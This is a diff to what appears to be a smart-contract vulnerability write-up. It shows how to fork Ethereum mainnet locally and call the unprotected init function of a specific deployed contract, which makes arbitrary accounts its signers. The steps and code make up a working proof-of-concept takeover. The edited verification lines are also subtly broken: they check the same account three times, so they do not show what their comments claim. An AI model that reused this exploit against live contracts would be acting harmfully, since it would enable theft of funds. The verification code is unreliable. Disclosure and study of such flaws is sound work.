@@ -38,6 +38,7 @@ The developer's intention was clear, but forgot to either protect the init funct
 
 ```
 npm install -g ganache-cli truffle
+npm install truffle-contract
 # Fork the mainnet locally from block 7899146
 ganache-cli -f https://mainnet.infura.io/v3/45aad5d782be4a68904db4fdf74c315c@7899146 --debug
 truffle console # on a different terminal
@@ -50,18 +51,23 @@ const abi = [{"constant":false,"inputs":[{"name":"toAddress","type":"address"},{
 
 const address = '0x6630f77801e3d8ee4c624a628d0979ab9e7d111b'
 
-var contract = require("truffle-contract”);
-var c = contract({abi: abi, address: address})
+var contract = require("truffle-contract");
+var c = contract({abi: abi, address: address});
 var provider = new web3.providers.HttpProvider("http://localhost:8545");
 c.setProvider(provider);
 var app;
 c.at(address).then(function(instance){app = instance;});
-app.init([web3.eth.accounts[0], web3.eth.accounts[1], web3.eth.accounts[2]], {from: web3.eth.accounts[0]})
 
-app.isSigner.call(web3.eth.accounts[0], {from: web3.eth.accounts[0]})
+var account0 = (await web3.eth.getAccounts())[0]
+var account1 = (await web3.eth.getAccounts())[1]
+var account2 = (await web3.eth.getAccounts())[2]
+
+app.init([account0, account1, account2], {from: account0})
+
+app.isSigner.call(account0, {from: account0})
 // true
-app.isSigner.call(web3.eth.accounts[1], {from: web3.eth.accounts[0]})
+app.isSigner.call(account0, {from: account1})
 // true
-app.isSigner.call(web3.eth.accounts[2], {from: web3.eth.accounts[0]})
+app.isSigner.call(account0, {from: account2})
 // true
 ```
